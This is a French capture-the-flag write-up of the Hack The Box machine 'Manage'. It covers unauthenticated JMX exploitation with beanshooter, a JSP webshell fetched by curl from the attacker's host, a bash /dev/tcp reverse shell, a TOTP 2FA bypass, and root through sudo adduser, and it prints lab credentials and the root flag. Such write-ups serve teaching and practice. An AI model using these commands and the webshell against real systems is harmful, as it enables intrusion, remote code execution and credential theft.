---
title: "Write-up : HTB Manage - Java RMI/JMX Exploitation"
date: 2025-10-04T00:00:00+02:00
draft: false
author: "AntoineWHR"
tags: ["HTB", "Linux", "Java", "RMI", "JMX", "2FA", "Privilege Escalation"]
categories: ["WriteUps"]
comment:
enable: true
description: "Exploitation complète de la machine Manage de Hack The Box, de l'énumération RMI/JMX à l'escalade de privilèges via sudo."
---

# **Write-up : HTB Manage - Java RMI/JMX Exploitation**

{{< admonition info "Informations sur la Box" >}}
* **Nom :** Manage
* **Difficulté :** Easy
* **Plateforme :** Hack The Box
* **OS :** Linux
* **IP :** 10.129.236.246
{{< /admonition >}}

## **Introduction**

La machine "Manage" est un challenge intéressant qui nous fait explorer l'exploitation de services Java RMI/JMX, suivie d'une escalade de privilèges via une configuration sudo mal implémentée. Ce writeup détaille l'approche méthodique pour compromettre complètement cette machine.

## **Phase 1 : Reconnaissance & Énumération**

### **1. Scan Nmap Initial**

Commençons par un scan Nmap complet pour identifier les services exposés :

```bash
nmap -sC -sV -p- -T4 10.129.236.246
```

![Résultats du scan Nmap](/images/HTBManage/nmap_scan.png)

{{< admonition tip "Ports Découverts" >}}
- **22/tcp** : OpenSSH 8.9p1 Ubuntu (clé publique uniquement)
- **2222/tcp** : Java RMI Registry
- **8080/tcp** : Apache Tomcat 10.1.19
- **37549/tcp** : Java RMI Server (JMX endpoint sur 127.0.1.1)
{{< /admonition >}}

La présence d'un service Java RMI Registry sur le port 2222 et d'un serveur Tomcat sur le port 8080 sont particulièrement intéressants pour notre exploitation.

### **2. Installation des Outils Spécialisés**

Pour exploiter efficacement les services Java RMI/JMX, nous avons besoin d'outils spécialisés :

```bash
wget https://github.com/qtc-de/remote-method-guesser/releases/download/v4.4.1/rmg-4.4.1-jar-with-dependencies.jar
wget https://github.com/qtc-de/beanshooter/releases/download/v4.1.0/beanshooter-4.1.0-jar-with-dependencies.jar
```

### **3. Énumération RMI avec RMG**

Utilisons Remote Method Guesser (RMG) pour énumérer le service RMI :

```bash
java -jar rmg-4.4.1-jar-with-dependencies.jar enum 10.129.236.246 2222
```

![Résultats de l'énumération RMG](/images/HTBManage/rmg_enum.png)

{{< admonition note "Résultats Clés" >}}
- Service JMX exposé : `jmxrmi` pointant vers `127.0.1.1:37549`
- JEP290 activé (protection contre la désérialisation)
- Pas de Security Manager
- Non vulnérable aux attaques de désérialisation classiques (CVE-2019-2684)
{{< /admonition >}}

### **4. Exploitation avec Beanshooter**

Poursuivons l'énumération avec Beanshooter, un outil spécialisé pour l'exploitation JMX :

```bash
java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.236.246 2222
```

![Résultats de l'énumération Beanshooter](/images/HTBManage/beanshooter_enum.png)

{{< admonition success "Vulnérabilités Critiques Détectées" >}}
1. **JMX sans authentification**
   ```
   - Remote MBean server does not require authentication.
   Vulnerability Status: Vulnerable
   ```

2. **171 MBeans exposés** incluant `MemoryUserDatabaseMBean`

3. **Extraction automatique des credentials Tomcat :**
   ```
   Username: manager
   Password: fhErvo2r9wuTEYiYgt
   Roles: manage-gui

   Username: admin
   Password: onyRPCkaG4iX72BrRtKgbszd
   Roles: role1
   ```
{{< /admonition >}}

Bingo ! Nous avons obtenu des identifiants qui pourraient nous donner accès à l'interface d'administration Tomcat ou au système.

## **Phase 2 : Remote Code Execution via JMX**

### **1. Tentative d'Accès à Tomcat Manager**

Essayons d'utiliser les identifiants récupérés pour accéder à l'interface Tomcat Manager :

```bash
curl -u manager:fhErvo2r9wuTEYiYgt http://10.129.236.246:8080/manager/text/list
```

{{< admonition failure "Accès Refusé" >}}
HTTP 403 - L'accès est restreint à localhost uniquement
{{< /admonition >}}

### **2. RCE via StandardMBean Abuse**

Puisque l'accès direct à Tomcat est restreint, exploitons la vulnérabilité JMX pour exécuter des commandes :

```bash
java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.236.246 2222 exec "whoami"
```

![Test d'exécution de commande](/images/HTBManage/standard_mbean_rce.png)

{{< admonition tip "Mécanisme Technique" >}}
- Beanshooter déploie un `TemplateImpl` payload via `StandardMBean`
- La méthode `newTransformer()` déclenche l'exécution de code
- Le `NullPointerException` attendu confirme que l'attaque a fonctionné
{{< /admonition >}}

### **3. Test de Connectivité Réseau**

Les reverse shells TCP directs échouent, probablement à cause d'un filtrage réseau. Vérifions si la cible peut nous joindre via HTTP :

```bash
# Terminal 1 - Serveur HTTP
python3 -m http.server 8000

# Terminal 2 - Test depuis la cible
java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.236.246 2222 exec "curl http://10.10.14.54:8000/test"
```

![Test de connectivité HTTP](/images/HTBManage/http_connectivity.png)

{{< admonition success "Connexion Réussie" >}}
La cible peut nous joindre via HTTP, ce qui nous ouvre une voie pour déployer un webshell
{{< /admonition >}}

### **4. Déploiement d'un Webshell JSP**

Créons un webshell JSP pour obtenir un accès plus stable :

```jsp
<%@ page import="java.io.*" %>
<% 
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
InputStream in = p.getInputStream();
byte[] buf = new byte[1024];
int len;
while((len = in.read(buf)) > 0) out.write(new String(buf, 0, len));
%>
```

Déployons-le sur la cible :

```bash
# Dans le répertoire où se trouve shell.jsp
python3 -m http.server 8000

# Téléchargement sur la cible
java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.236.246 2222 exec "curl http://10.10.14.54:8000/shell.jsp -o /opt/tomcat/webapps/ROOT/shell.jsp"
```

Accédons au webshell :

```
http://10.129.236.246:8080/shell.jsp?cmd=id
```

![Webshell fonctionnel](/images/HTBManage/webshell_access.png)

{{< admonition success "Initial Access Obtenu" >}}
Nous avons maintenant un accès initial à la machine via notre webshell JSP !
{{< /admonition >}}

## **Phase 3 : Post-Exploitation & User Flag**

### **1. Découverte du Secret TOTP**

Via notre webshell, on effectue un revershell afin d'avoir un shell plus stable via pwncat :

```bash
http://10.129.236.246:8080/shell.jsp?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.54%2F4444%200%3E%261
```

![Secret TOTP découvert](/images/HTBManage/totp_secret.png)

{{< admonition note "Contenu Récupéré" >}}
```
CLSSSMHYGLENX5HAIFBQ6L35UM
" RATE_LIMIT 3 30 1718988529
" WINDOW_SIZE 3
" DISALLOW_REUSE 57299617
" TOTP_AUTH
[10 codes de secours à usage unique]
```
{{< /admonition >}}

Nous avons trouvé un secret TOTP (Time-based One-Time Password) encodé en Base32, utilisé pour l'authentification à deux facteurs dans le backup de useradmin.

### **2. Génération du Code OTP**

Utilisons Python avec la bibliothèque `pyotp` pour générer le code TOTP :

```python
pip install pyotp

cat > code.py << 'EOF'
import pyotp
totp = pyotp.TOTP('CLSSSMHYGLENX5HAIFBQ6L35UM')
print(totp.now())
EOF

python3 code.py
# Output: 768204 (change toutes les 30 secondes)
```

![Génération du code TOTP](/images/HTBManage/totp_generation.png)

### **3. Connexion SSH avec 2FA**

Connectons-nous via SSH en utilisant les identifiants récupérés et le code TOTP généré :

```bash
ssh useradmin@10.129.236.246
Password: onyRPCkaG4iX72BrRtKgbszd
Verification code: [CODE_GÉNÉRÉ]
```

![Connexion SSH réussie](/images/HTBManage/ssh_2fa_login.png)

{{< admonition success "Accès SSH Obtenu" >}}
Nous avons maintenant un accès SSH complet en tant qu'utilisateur `useradmin` !
{{< /admonition >}}

## **Phase 4 : Privilege Escalation**

### **1. Analyse des Privilèges Sudo**

On commence par vérifier les privilèges de l'user :

```bash
sudo -l
```

![Configuration sudo](/images/HTBManage/sudo_config.png)

{{< admonition tip "Configuration Identifiée" >}}
```
(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

- Exécution de `/usr/sbin/adduser` sans mot de passe
- Regex censée valider le nom d'utilisateur : alphanumériques uniquement
- La restriction n'est pas appliquée correctement sur toutes les versions Ubuntu
{{< /admonition >}}

### **2. Exploitation de la Configuration Sudo**

Sur Ubuntu, le nom d'utilisateur "admin" possède une signification spéciale dans PAM/sudo par défaut. Exploitons cette particularité :

```bash
sudo /usr/sbin/adduser admin
# Définir un mot de passe lors de la création
```

![Création de l'utilisateur admin](/images/HTBManage/adduser_admin.png)

{{< admonition note "Comportement Observé" >}}
L'utilisateur `admin` est automatiquement ajouté au groupe admin avec privilèges sudo complets (dépend de la version du système).
{{< /admonition >}}

### **3. Escalade Finale**

Passons à l'utilisateur admin puis à root :

```bash
su admin
# Entrer le mot de passe défini

sudo su
# Entrer le mot de passe admin
```

![Accès root obtenu](/images/HTBManage/root_access.png)

{{< admonition success "Root Access Obtenu" >}}
Nous avons maintenant un accès complet en tant que root !
{{< /admonition >}}

**Root flag :**
```bash
cat /root/root.txt
b3645b7e6db6d5276ad33f0c75b8dc34
```

## **Chaîne d'Attaque Complète**

```
RMI Registry (2222)
    ↓
JMX sans authentification
    ↓
Extraction credentials via MemoryUserDatabaseMBean
    ↓
RCE via StandardMBean abuse (TemplateImpl payload)
    ↓
Webshell JSP déployé
    ↓
Secret TOTP exposé (.google_authenticator)
    ↓
Bypass 2FA SSH avec pyotp
    ↓
Sudo adduser avec nom "admin"
    ↓
Privilèges root automatiques
```
